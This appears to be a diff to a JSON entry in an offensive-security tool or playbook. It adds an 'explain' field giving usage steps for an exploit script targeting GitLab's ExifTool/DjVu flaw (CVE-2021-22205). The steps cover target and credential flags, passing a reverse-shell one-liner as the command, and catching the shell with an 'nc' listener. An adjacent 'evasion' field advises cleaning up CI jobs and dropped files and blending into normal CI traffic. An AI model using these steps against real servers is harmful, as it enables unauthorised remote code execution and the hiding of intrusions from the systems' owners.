@@ -90,5 +90,6 @@
       "OWASP A06:2021"
     ],
     "evasion": "Use valid session/token auth; clean up any runner/CI job or dropped file used for execution; blend into normal CI traffic."
-  }
+  },
+  "explain": "Exploits the GitLab ExifTool/DjVu flaw for RCE (CVE-2021-22205):\n  python3 gitlab_13_10_2_rce.py   the exploit\n  -t http://<url>:8081            target\n  -u/-p                           GitLab credentials (some versions are unauthenticated)\n  -c '<reverse_shell>'            the command to run\nMalicious image metadata is passed to a vulnerable ExifTool, executing your command; give it a reverse-shell one-liner and catch it with 'nc -lnvp'."
 }
